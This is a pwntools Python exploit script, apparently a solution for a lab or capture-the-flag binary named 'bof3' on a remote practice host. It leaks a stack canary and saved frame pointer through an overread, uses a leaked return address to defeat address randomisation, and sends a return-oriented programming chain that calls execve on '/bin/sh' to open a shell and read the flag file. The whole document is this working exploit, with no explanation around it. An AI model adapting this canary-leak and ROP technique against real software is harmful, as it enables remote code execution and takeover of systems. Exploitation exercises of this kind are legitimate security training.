#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *
import sys

context.arch = 'amd64'
context.os = 'linux'

exe = './bof3'
port = 10261

elf = ELF(exe)
off_main = elf.symbols[b'main']
base = 0
qemu_base = 0

r = None
if 'local' in sys.argv[1:]:
    r = process(exe, shell=False)
elif 'qemu' in sys.argv[1:]:
    qemu_base = 0x4000000000
    r = process(f'qemu-x86_64-static {exe}', shell=True)
else:
    r = remote('up.zoolab.org', port)

r.recvuntil(b'name? ')
r.send(b'A'*41)

z = r.recvline()
canary = (u64(z.split(b'A'*41)[1][:7].ljust(8, b'\x00')))
old_rbp = (u64(z.split(b'A'*41)[1][7:-1].ljust(8, b'\x00')))

r.recvuntil(b'number? ')
r.send(b'A'*41 + p64(canary)[:7] + b'B'*8)

z = r.recvline()
task_return = (u64(z.split(b'B'*8)[1][:-1].ljust(8, b'\x00')))

base_addr = task_return - 108 - off_main
new_rbp = old_rbp - 0x40
pop_rdi_ret = base_addr + 0x917f
pop_rsi_ret = base_addr + 0x111ee
pop_rdx_ret = base_addr + 0x8dd8b
pop_rax_ret = base_addr + 0x57187
syscall = base_addr + 0x8f34

buf = p64(0x68732f6e69622f) + b'A'*32 + b'\x00' + p64(canary)[:7] + b'B'*8 + p64(pop_rdi_ret) + p64(new_rbp) + p64(pop_rsi_ret) + b'\x00'*8 + p64(pop_rdx_ret) + b'\x00'*16 + p64(pop_rax_ret) + p64(59) + p64(syscall)
r.recvuntil(b'name? ')
r.send(buf)
r.recvuntil(b'message: ')
r.send(buf)

r.send(b'cat /FLAG\n')
r.interactive()
